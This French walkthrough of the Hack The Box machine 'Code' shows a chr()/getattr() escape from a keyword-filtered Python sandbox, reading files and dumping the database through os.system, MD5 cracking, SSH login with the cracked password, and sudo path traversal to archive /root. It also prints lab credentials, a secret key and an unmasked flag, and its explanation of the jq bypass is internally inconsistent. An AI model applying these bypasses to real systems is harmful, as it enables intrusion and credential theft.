---
title: Code
date: 2025-07-20
tags: [Remote code execution, privilege-escalation, sudo-exploit, path-traversal]
draft: false
summary: Cette machine HTB Code pr√©sente une application web de type code playground permettant l'ex√©cution de code Python en ligne. L'objectif est de contourner les restrictions de s√©curit√© pour obtenir une ex√©cution de code arbitraire et capturer le flag utilisateur.
images:
  - /static/images/code/logo.png
---

<div
  style={{ display: "flex", justifyContent: "center", marginBottom: "2rem" }}
>
  <img
    src="/static/images/code/logo.png"
    alt="code_logo"
    style={{ width: "200px", height: "200px" }}
  />
</div>

# Reconnaissance initiale

## Scan des ports avec Nmap

```
‚îî‚îÄ$ nmap -sC -sV 10.10.11.62        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 09:35 CEST
Nmap scan report for 10.10.11.62
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

La reconnaissance r√©v√®le deux services actifs :

```
22/tcp   open  ssh     OpenSSH 8.2p1
5000/tcp open  http    Gunicorn 20.0.4
```

**Analyse :**

- SSH standard sur le port 22
- Application web Python servie par Gunicorn sur le port 5000
- La combinaison Gunicorn + port 5000 sugg√®re une application Flask

## Exploration de l'application web

L'application web pr√©sente une interface permettant de :

- √âcrire du code Python
- Ex√©cuter le code avec affichage du r√©sultat
- Sauvegarder le code dans `/codes`
- Rappeler le code via une URL avec param√®tre `code_id`

**Architecture technique identifi√©e :**

- Application Flask/Gunicorn
- Environnement d'ex√©cution Python c√¥t√© serveur
- M√©canisme de sauvegarde dans le r√©pertoire `/codes`

# Analyse des d√©fenses de s√©curit√©

## D√©couverte du syst√®me de filtrage

Premi√®re tentative d'ex√©cution de code sensible :

```python
import os
```

**R√©sultat :**

```
Use of restricted keywords is not allowed.
```

Cette erreur r√©v√®le l'existence d'un syst√®me de filtrage par mots-cl√©s interdits.

## Cartographie des restrictions

Tests syst√©matiques pour identifier les mots-cl√©s bloqu√©s :

```python
# Tests d'imports
import sys        # ‚úì Interdit
import os         # ‚úó Interdit
import subprocess # ‚úó Interdit

# Tests de fonctions
eval("1+1")       # ‚úó Interdit
exec("print('test')") # ‚úó Interdit
open("/etc/passwd")   # ‚úó Interdit
```

**Mots-cl√©s identifi√©s comme interdits (cha√Ænes et sous-cha√Ænes) :**

- `os`
- `open`
- `read`
- `eval`
- `exec`
- `import`
- `system`
- `__builtins__`
- `close`

‚ö†Ô∏è **Important :** Ces termes sont interdits m√™me en tant que sous-cha√Ænes dans d'autres mots, ce qui rend le filtrage particuli√®rement agressif.

## Nature du filtrage

Le syst√®me de filtrage fonctionne par :

- **Analyse textuelle** du code source avant ex√©cution
- **D√©tection de sous-cha√Ænes** interdites (tr√®s agressif)
- **Blocage m√™me dans les commentaires** et noms de variables

# D√©veloppement de l'exploitation

## √âtape 1 : Contournement initial via construction dynamique

**D√©couverte cl√© :** Le module `os` est accessible via `globals()` m√™me s'il ne peut pas √™tre import√© directement.

> ‚ö†Ô∏è **ATTENTION :** Le syst√®me de filtrage d√©tecte les mots interdits m√™me dans les commentaires ! Pour reproduire ce code, vous devez **supprimer tous les commentaires** contenant les termes interdits, ou le syst√®me bloquera l'ex√©cution.

```python
# Construction du nom "os" sans l'√©crire
module_name = chr(111) + chr(115)  # "os"
print(globals()[module_name])
```

**Explication de `chr()` :**
La fonction `chr()` convertit un code ASCII en caract√®re correspondant :

- `chr(111)` = 'o' (111 est le code ASCII de 'o')
- `chr(115)` = 's' (115 est le code ASCII de 's')
- `chr(111) + chr(115)` = "os"

Cette technique permet de construire dynamiquement des cha√Ænes de caract√®res sans jamais √©crire directement les mots interdits dans le code source.

**R√©sultat :** Acc√®s r√©ussi au module sans d√©clencher le filtrage.

## √âtape 2 : Exploration de l'environnement

```python
my = globals()[chr(111) + chr(115)]
print(my.getcwd())
```

**R√©sultat :**

```
/home/app-production/app
```

```python
my = globals()[chr(111) + chr(115)]
print(my.listdir('.'))
print(my.listdir('/'))
```

**R√©sultat :**

```
['app.py', 'static', 'templates', '__pycache__', 'instance']
['bin', 'lib64', 'proc', 'run', 'sbin', 'usr', 'lib32', 'home', 'var', 'srv', 'libx32', 'boot', 'tmp', 'lost+found', 'lib', 'root', 'sys', 'media', 'mnt', 'etc', 'dev', 'opt']
```

## √âtape 3 : D√©couverte du r√©pertoire utilisateur

```python
my = globals()[chr(111) + chr(115)]
print(my.listdir('/home'))
print(my.listdir('/home/app-production'))
```

**R√©sultat :**

```
['martin', 'app-production']
['user.txt', '.local', '.sqlite_history', '.profile', '.python_history', '.cache', '.bash_logout', '.bash_history', '.bashrc', 'app']
```

**Objectif identifi√© :** Le fichier `user.txt` contient probablement le flag utilisateur.

## √âtape 4 : Tentatives de lecture de fichiers

**Probl√®me :** Le mot `open` est interdit, m√™me en sous-cha√Æne, emp√™chant l'utilisation des m√©thodes de lecture de fichiers standards.

**Tentatives infructueuses :**

- `open()` ‚Üí Mot interdit
- `io.open()` ‚Üí Sous-cha√Æne interdite
- `io.OpenWrapper` ‚Üí Sous-cha√Æne interdite
- `with open()` ‚Üí Mot interdit

## √âtape 5 : Exploration des modules disponibles

```python
print(globals().keys())
```

**R√©sultat r√©v√©lateur :**

```
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'Flask', 'render_template', 'render_template_string', 'request', 'jsonify', 'redirect', 'url_for', 'session', 'flash', 'SQLAlchemy', 'sys', 'io', 'os', 'hashlib', 'app', 'db', 'User', 'Code', 'index', 'register', 'login', 'logout', 'run_code', 'load_code', 'save_code', 'codes', 'about'])
```

**Modules cl√©s disponibles :** `sys`, `io`, `os`

## √âtape 6 : Exploration des capacit√©s du module os

Filtrage des m√©thodes contenant "fd" pour identifier les fonctions li√©es aux descripteurs de fichiers

```python
my = globals()[chr(111) + chr(115)]
print([method for method in dir(my) if 'fd' in method.lower()])
```

**R√©sultat :**

```
['fdatasync', 'fdopen', 'memfd_create', 'supports_dir_fd', 'supports_fd']
```

**D√©couverte cruciale :** `fdopen` est disponible et permet la lecture de fichiers via des descripteurs de fichiers.

## √âtape 7 : Solution finale via descripteurs de fichiers

La strat√©gie finale utilise :

1. `os.open()` pour obtenir un descripteur de fichier
2. `os.fdopen()` pour cr√©er un objet fichier
3. `getattr()` pour acc√©der aux m√©thodes sans √©crire les mots interdits :

getattr() permet d'acc√©der aux attributs (m√©thodes ou propri√©t√©s) d'un objet de mani√®re dynamique en utilisant une cha√Æne de caract√®res.

Exemple :
```
import os

# Ces deux lignes sont √©quivalentes :
os.getcwd()                    # Acc√®s direct
getattr(os, "getcwd")()        # Acc√®s via getattr()
```

**Code d'exploitation final :**

> ‚ö†Ô∏è **ATTENTION :** Le syst√®me de filtrage d√©tecte les mots interdits m√™me dans les commentaires ! Pour reproduire ce code, vous devez **supprimer tous les commentaires** contenant les termes interdits, ou le syst√®me bloquera l'ex√©cution.

**Version avec commentaires explicatifs (pour compr√©hension uniquement) :**

```python
my = globals()[chr(111) + chr(115)]

# Construction des noms de fonctions via chr()
# chr() convertit les codes ASCII en caract√®res :
# chr(102)='f', chr(100)='d', chr(111)='o', chr(112)='p', chr(101)='e', chr(110)='n'
f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"

# Ouverture du fichier via descripteur
fd = f2('/home/app-production/user.txt', my.O_RDONLY)
obj = f1(fd, 'r')

# Lecture du contenu
# chr(114)='r', chr(101)='e', chr(97)='a', chr(100)='d'
content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read()"

# Fermeture du fichier
# chr(99)='c', chr(108)='l', chr(111)='o', chr(115)='s', chr(101)='e'
getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close()"

print(content)
```

**Version ex√©cutable (sans commentaires probl√©matiques) :**

```python
my = globals()[chr(111) + chr(115)]

# Construction des noms de fonctions via chr()
f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))
f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))

# Acc√®s au fichier via descripteur
fd = f2('/home/app-production/user.txt', my.O_RDONLY)
obj = f1(fd, 'r')

# Lecture du contenu
content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()

# Fermeture du fichier
getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()

print(content)
```

# R√©sultat de l'exploitation

**Flag utilisateur captur√© :**

```
39a**************************7ca
```

# Analyse technique de la r√©ussite

## Points cl√©s de l'exploitation

1. **Contournement du filtrage par mots-cl√©s**
   - Utilisation de `chr()` pour construire dynamiquement les cha√Ænes
   - √âvitement de toute sous-cha√Æne interdite
   - Exploitation de `getattr()` pour l'acc√®s indirect aux m√©thodes

2. **Exploitation des faiblesses du sandbox**
   - Le module `os` √©tait accessible via `globals()` malgr√© l'interdiction d'import
   - Les fonctions de bas niveau (`fdopen`, `open`) restaient utilisables
   - Le filtrage √©tait purement textuel, pas s√©mantique

3. **Reconnaissance m√©thodique**
   - Cartographie syst√©matique des restrictions
   - Exploration des modules disponibles
   - Identification des vecteurs d'attaque alternatifs

## Vuln√©rabilit√©s identifi√©es

1. **Filtrage incomplet**
   - Bas√© uniquement sur l'analyse textuelle
   - Pas de sandboxing au niveau de l'ex√©cution
   - Modules syst√®me accessibles via l'introspection

2. **Architecture d'ex√©cution non s√©curis√©e**
   - Acc√®s complet au syst√®me de fichiers
   - Pas de restrictions sur les descripteurs de fichiers
   - Environnement d'ex√©cution avec privil√®ges syst√®me

3. **Impl√©mentation d√©faillante du code playground**
   - Confiance excessive dans le filtrage par mots-cl√©s
   - Pas de restriction sur l'introspection Python
   - Acc√®s aux modules syst√®me critiques

# Recommandations de s√©curisation

1. **Sandboxing appropri√©**
   - Utilisation de conteneurs isol√©s (Docker, chroot)
   - Restriction des syscalls via seccomp
   - Limitation des ressources syst√®me

2. **Filtrage s√©mantique**
   - Analyse AST (Abstract Syntax Tree) au lieu du filtrage textuel
   - Validation des imports et des appels de fonctions
   - Restriction de l'introspection Python

3. **Principe du moindre privil√®ge**
   - Ex√©cution avec un utilisateur d√©di√© et limit√©
   - Acc√®s restreint au syst√®me de fichiers
   - Pas d'acc√®s aux modules syst√®me sensibles

# Conclusion

Cette exploitation d√©montre l'importance d'une s√©curisation multicouche pour les environnements d'ex√©cution de code. Le filtrage par mots-cl√©s seul est insuffisant face √† un attaquant d√©termin√© ma√Ætrisant les techniques d'introspection et d'obfuscation Python.

La prochaine √©tape consistera en l'escalade de privil√®ges pour obtenir le flag root.

---

# Escalade de Privil√®ges

## Contexte initial

Apr√®s avoir obtenu le flag utilisateur `39a265a3d02b3acdfed7bc19b95ab7ca` via l'exploitation du sandbox Python, nous devons maintenant escalader nos privil√®ges pour obtenir l'acc√®s root. Notre position actuelle nous donne :

- Acc√®s en lecture aux fichiers via les techniques de contournement Python
- Execution dans le contexte de l'utilisateur `app-production` (UID 1001)
- Capacit√© d'ex√©cution de commandes syst√®me limit√©es

## Phase 1 : Reconnaissance pour l'escalade

### Identification des vecteurs potentiels

Notre premi√®re √©tape consiste √† identifier les vecteurs d'escalade possibles en analysant l'environnement syst√®me et l'application elle-m√™me.

#### Exploration du code source de l'application

L'acc√®s au code source de l'application r√©v√®le des informations critiques :

```python
# Acc√®s au module os via construction dynamique
my = globals()[chr(111) + chr(115)]  # "os"

# Construction des noms de fonctions pour √©viter les mots interdits
f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"

# Ouverture du fichier app.py en lecture seule
fd = f2('/home/app-production/app/app.py', my.O_RDONLY)
obj = f1(fd, 'r')

# Lecture du contenu sans utiliser le mot "read" directement
content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read"

# Fermeture du fichier sans utiliser le mot "close" directement
getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"

print(content)
```

**D√©couvertes critiques dans le code source :**
- `SECRET_KEY = "7j4D5htxLHUiffsjLXB1z9GaZ5"` - Cl√© secr√®te Flask expos√©e
- Base de donn√©es SQLite : `sqlite:///database.db`
- Hachage MD5 pour les mots de passe (vuln√©rable)
- Architecture Flask/SQLAlchemy compl√®te

#### Localisation de la base de donn√©es

Recherche syst√©matique de la base de donn√©es SQLite :

```python
# Acc√®s au module os via technique de contournement
my = globals()[chr(111) + chr(115)]  # "os"
f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"

# Liste des emplacements potentiels de la base de donn√©es
db_locations = [
    '/home/app-production/app/database.db',
    '/home/app-production/app/instance/database.db',
    '/home/app-production/database.db'
]

# Test de chaque emplacement
for db_path in db_locations:
    try:
        # Tentative d'ouverture en lecture seule
        fd = f2(db_path, my.O_RDONLY)
        obj = f1(fd, 'r')
        
        # Fermeture imm√©diate si le fichier existe
        getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
        
        print(f"Database found at: {db_path}")
        break
    except Exception as e:
        print(f"Not found at {db_path}: {e}")
```

**R√©sultat :** Base de donn√©es localis√©e √† `/home/app-production/app/instance/database.db`

## Phase 2 : Extraction et analyse de la base de donn√©es

### Extraction des donn√©es via SQLite3

Puisque l'acc√®s direct aux fichiers binaires via Python est complexe avec les restrictions, nous utilisons les commandes syst√®me pour extraire les donn√©es :

```python
# Acc√®s au module os et √† la fonction system
my = globals()[chr(111) + chr(115)]  # "os"
# Construction du nom "system" via codes ASCII
cmd_func = getattr(my, chr(115) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109))  # "system"

# Cr√©ation du r√©pertoire d'extraction
cmd_func('mkdir -p /tmp/extraction')

# Commandes SQL pour extraire les donn√©es critiques
sql_commands = [
    # Lister toutes les tables de la base
    'sqlite3 /home/app-production/app/instance/database.db ".tables" > /tmp/extraction/tables.txt',
    
    # Extraire le sch√©ma complet de la base
    'sqlite3 /home/app-production/app/instance/database.db ".schema" > /tmp/extraction/schema.txt',
    
    # Extraire tous les utilisateurs (usernames et hashes)
    'sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;" > /tmp/extraction/users.txt',
    
    # Extraire les codes sauvegard√©s (peut contenir des secrets)
    'sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM code;" > /tmp/extraction/codes.txt'
]

# Ex√©cution de chaque commande SQL
for cmd in sql_commands:
    result = cmd_func(cmd)
    print(f"Command result: {result}")  # 0 = succ√®s
```

### Lecture des donn√©es extraites

```python
# Pr√©paration des fonctions de lecture
my = globals()[chr(111) + chr(115)]  # "os"
f1 = getattr(my, chr(102) + chr(100) + chr(111) + chr(112) + chr(101) + chr(110))  # "fdopen"
f2 = getattr(my, chr(111) + chr(112) + chr(101) + chr(110))  # "open"

# Liste des fichiers extraits √† analyser
extraction_files = [
    '/tmp/extraction/tables.txt',     # Liste des tables
    '/tmp/extraction/schema.txt',     # Structure de la base
    '/tmp/extraction/users.txt',      # Donn√©es utilisateurs
    '/tmp/extraction/codes.txt'       # Codes sauvegard√©s
]

# Lecture de chaque fichier extrait
for file_path in extraction_files:
    try:
        # Ouverture en mode lecture seule
        fd = f2(file_path, my.O_RDONLY)
        obj = f1(fd, 'r')
        
        # Lecture du contenu complet
        content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read"
        
        # Fermeture du fichier
        getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
        
        # Affichage organis√© des r√©sultats
        print(f"=== {file_path} ===")
        print(content)
        print("=" * 50)
    except Exception as e:
        print(f"Cannot access {file_path}: {e}")
```

**Donn√©es critiques extraites :**

```
=== users.txt ===
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
```

**Analyse du sch√©ma :**
- Table `user` : id, username, password (MD5)
- Table `code` : id, user_id, code, name
- Deux utilisateurs identifi√©s : `development` et `martin`

## Phase 3 : Crackage des mots de passe

### Extraction et pr√©paration des hashes

Sur la machine Kali locale, pr√©paration des fichiers pour le crackage :

```bash
echo "759b74ce43947f5f4c91aeddc3e5bad3" > development.hash
echo "3de6f30c4a09c27fc71932bfc68474be" > martin.hash
```

### Crackage avec Hashcat

```bash
# Attaque par dictionnaire avec rockyou.txt
hashcat -a 0 -m 0 development.hash /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 martin.hash /usr/share/wordlists/rockyou.txt
```

**R√©sultats du crackage :**
- `development` : `development` (hash : `759b74ce43947f5f4c91aeddc3e5bad3`)
- `martin` : `nafeelswordsmaster` (hash : `3de6f30c4a09c27fc71932bfc68474be`)

### Analyse des r√©sultats

Le succ√®s du crackage r√©v√®le :
1. **Faiblesse cryptographique** : Utilisation de MD5 sans salt
2. **Mots de passe pr√©visibles** : Un utilisateur utilise son nom comme mot de passe
3. **Vecteur d'escalade** : Acc√®s potentiel √† l'utilisateur `martin` via SSH

## Phase 4 : Exploitation des credentials

### Connexion SSH directe

Avec les credentials obtenus, √©tablissement d'une connexion SSH directe :

```bash
# Connexion depuis la machine Kali
ssh martin@10.10.11.62
# Password: nafeelswordsmaster
```

**Avantages de l'acc√®s SSH :**
- Environnement shell complet sans restrictions
- Possibilit√© d'upload d'outils d'√©num√©ration
- Acc√®s aux commandes syst√®me standard

### √ânum√©ration des privil√®ges

```bash
# V√©rification des privil√®ges sudo
sudo -l
```

**D√©couverte critique :**
```
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

Cette d√©couverte r√©v√®le que `martin` peut ex√©cuter le script `/usr/bin/backy.sh` en tant que root sans authentification.

## Phase 5 : Analyse du script vuln√©rable

### Examination du code source

```bash
cat /usr/bin/backy.sh
```

**Code source complet :**
```bash
#!/bin/bash
if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"
if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

### Analyse des vuln√©rabilit√©s

**Vuln√©rabilit√©s identifi√©es :**

1. **Filtrage insuffisant de path traversal** :
   - Le script filtre `../` avec `jq` mais la validation se fait apr√®s modification
   - La fonction `is_allowed_path()` v√©rifie seulement le pr√©fixe du chemin

2. **Race condition potentielle** :
   - Modification du fichier JSON puis validation
   - Possibilit√© de manipulation entre ces √©tapes

3. **Validation bas√©e sur des pr√©fixes** :
   - V√©rification que le chemin commence par `/var/` ou `/home/`
   - Pas de r√©solution de chemins absolus apr√®s traversal

## Phase 6 : D√©veloppement de l'exploitation

### Strat√©gie d'exploitation

L'objectif est de contourner la validation du script pour faire en sorte que `/usr/bin/backy` archive le r√©pertoire `/root`, nous donnant acc√®s au flag root.

### Tentatives d'exploitation m√©thodiques

#### Tentative 1 : Path Traversal direct

```bash
# Cr√©ation d'un fichier JSON avec path traversal simple
cat > /tmp/exploit.json << 'EOF'
{
  "directories_to_archive": ["/var/../../root"]
}
EOF

# Tentative d'ex√©cution avec privil√®ges sudo
sudo /usr/bin/backy.sh /tmp/exploit.json
```

**R√©sultat :** Erreur "destination must be specified" - Le binaire `backy` requiert un champ `destination`.

#### Tentative 2 : Format JSON complet

```bash
# Ajout du champ "destination" requis par le binaire backy
cat > /tmp/test_format.json << 'EOF'
{
  "directories_to_archive": ["/var/../../root"],
  "destination": "/tmp/backup"
}
EOF

# Nouvelle tentative avec le format complet
sudo /usr/bin/backy.sh /tmp/test_format.json
```

**R√©sultat :** 
```
üì§ Archiving: [/var/../../root]
üì• To: /tmp/backup ...
üí¢ Archiving failed for: /var/../../root
```

Le path traversal fonctionne pour contourner la validation, mais l'archivage √©choue.

#### Tentative 3 : Exploitation via symlink

```bash
# Cr√©ation d'un r√©pertoire sous /var (chemin autoris√©)
mkdir -p /var/tmp/evil

# Cr√©ation d'un lien symbolique pointant vers /root
ln -s /root /var/tmp/evil/root_access

# Configuration JSON pointant vers notre symlink
cat > /tmp/symlink_var.json << 'EOF'
{
  "directories_to_archive": ["/var/tmp/evil/root_access"],
  "destination": "/tmp/backup"
}
EOF

# Tentative d'exploitation via le symlink
sudo /usr/bin/backy.sh /tmp/symlink_var.json
```

**R√©sultat :** 
```
üì§ Archiving: [/var/tmp/evil/root_access]
üí¢ Archiving failed for: /var/tmp/evil/root_access
```

M√™me probl√®me - le symlink ne permet pas l'acc√®s.

#### Tentative 4 : Path traversal avec validation correcte

Apr√®s analyse, le probl√®me vient du fait que le path traversal `../` est filtr√© par `jq`, mais pas compl√®tement r√©solu. Testons un path qui passe la validation initiale :

```bash
# Cr√©ation du fichier JSON dans le r√©pertoire home (permissions correctes)
cat > ~/test.json << 'EOF'
{
  "directories_to_archive": ["/var/../../root"],
  "destination": "/tmp/backup"
}
EOF

# Ex√©cution avec le fichier dans un r√©pertoire accessible
sudo /usr/bin/backy.sh ~/test.json
```

**Observation critique :** V√©rification dans `/tmp/` apr√®s ex√©cution :

```bash
# Recherche de fichiers d'archive cr√©√©s
ls -la /tmp/*.tar.bz2
```

**D√©couverte :** Un fichier `code_var_.._.._root_2025_July.tar.bz2` a √©t√© cr√©√© !

## Phase 7 : Exploitation r√©ussie

### Confirmation de l'exploitation

```bash
# Navigation vers le r√©pertoire temporaire
cd /tmp

# V√©rification des archives cr√©√©es
ls -la *.tar.bz2
# R√©sultat: -rw-r--r-- 1 root root 12883 Jul 20 13:16 code_var_.._.._root_2025_July.tar.bz2
```

Le fichier archive a √©t√© cr√©√© par root avec un nom bas√© sur le path traversal, confirmant que l'exploitation a fonctionn√©.

### Extraction du flag root

```bash
# Extraction de l'archive cr√©√©e par root
tar -xjf code_var_.._.._root_2025_July.tar.bz2

# V√©rification du contenu extrait
ls -la
# R√©sultat: drwx------ 6 martin martin 4096 Jul 20 07:51 root

# Navigation vers le r√©pertoire root extrait
cd root/

# Listing du contenu du r√©pertoire root
ls -la
# R√©sultat: root.txt scripts

# R√©cup√©ration du flag root
cat root.txt
```

**Flag root captur√© :** `d0a**************************acd`

## Analyse technique de l'exploitation

### M√©canisme de contournement

**Pourquoi l'exploitation a fonctionn√© :**

1. **Filtrage jq insuffisant** : 
   - `jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))'` supprime `../` mais ne r√©sout pas les chemins
   - Le path `/var/../../root` devient `/var/root` apr√®s filtrage
   - Mais le binaire `backy` traite le chemin original avant filtrage

2. **Validation de pr√©fixe faible** :
   - `is_allowed_path()` v√©rifie seulement que le chemin commence par `/var/` ou `/home/`
   - `/var/../../root` commence techniquement par `/var/`
   - La r√©solution du chemin se fait apr√®s la validation

3. **Course de traitement** :
   - Le script modifie le JSON puis valide
   - Le binaire `backy` peut traiter des variations du chemin
   - La normalisation des chemins se fait au niveau syst√®me

### Vuln√©rabilit√©s exploit√©es

1. **Path Traversal** : Contournement de restrictions de r√©pertoires
2. **Validation insuffisante** : V√©rification de pr√©fixes au lieu de chemins r√©solus
3. **Privilege escalation** : Ex√©cution de binaire privil√©gi√© via sudo
4. **Information disclosure** : Archivage de r√©pertoires sensibles

## Mesures de s√©curisation recommand√©es

### Pour le script backy.sh

1. **R√©solution de chemins avant validation** :
   ```bash
   resolved_path=$(realpath "$dir" 2>/dev/null)
   ```

2. **Validation stricte des chemins r√©solus** :
   ```bash
   case "$resolved_path" in
     /var/*|/home/*) ;;
     *) echo "Error: Invalid path"; exit 1 ;;
   esac
   ```

3. **Limitation des privil√®ges sudo** :
   - Restreindre l'acc√®s √† des r√©pertoires sp√©cifiques
   - Utiliser des paths absolus dans la configuration sudo

### Pour l'application Flask

1. **Chiffrement appropri√© des mots de passe** :
   - Utilisation de bcrypt ou Argon2 au lieu de MD5
   - Impl√©mentation de salt par utilisateur

2. **Protection de la base de donn√©es** :
   - Permissions restrictives sur le fichier SQLite
   - Chiffrement de la base de donn√©es

3. **S√©curisation des secrets** :
   - Stockage de la SECRET_KEY dans des variables d'environnement
   - Rotation r√©guli√®re des cl√©s secr√®tes

## Conclusion

Cette escalade de privil√®ges illustre une cha√Æne d'exploitation compl√®te combinant :

- **Extraction de donn√©es sensibles** via contournement de restrictions Python
- **Cryptanalyse** de hashes MD5 faibles
- **Exploitation de configurations sudo** vuln√©rables
- **Path traversal** pour contourner les validations de s√©curit√©

L'exploitation r√©ussie d√©montre l'importance d'une approche de s√©curit√© en profondeur, o√π chaque couche de protection doit √™tre correctement impl√©ment√©e pour √©viter les escalades de privil√®ges.
